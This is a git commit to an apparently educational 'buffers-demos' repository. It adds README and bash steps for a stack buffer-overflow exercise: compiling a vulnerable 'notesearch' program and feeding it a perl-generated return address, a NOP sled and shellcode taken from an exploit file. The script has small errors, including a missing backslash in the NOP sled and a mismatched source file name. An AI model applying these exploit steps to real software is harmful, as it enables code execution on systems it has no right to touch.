2a5ad136992f667af4989588b1dc11a681704777
Gidraff <kamandegid@gmail.com>
2023-09-19 04:27:26 +0300

    feat(docs):  update readme file

--- README.md
+++ README.md
@@ -1,1 +1,9 @@
 # buffers-demos
+
+
+Inject shellcode:
+```c
+gcc -g -o notesearch notesearch.c 
+
+./notesearch $(perl -e 'print "\xb4\xcd\xed\x30"*20')
+```
--- bash_perl.sh
+++ bash_perl.sh
@@ -1,8 +1,16 @@
 #!/bin/bash
 
+TARGET_PROGRAM=notesearch
+
 echo "About to prints a loop"
 
 for i in $(head exploit_notsearch.c | grep "\"" | cut -d\" -f2); 
 do
     echo -en $i
 done > shellcode.bin
+
+export SHELLCODE=$(perl -e 'print "x90"x200')$(cat shellcode.bin)
+
+gcc -g -o $TARGET_PROGRAM notesearcher.c
+
+./$TARGET_PROGRAM $SHELLCODE
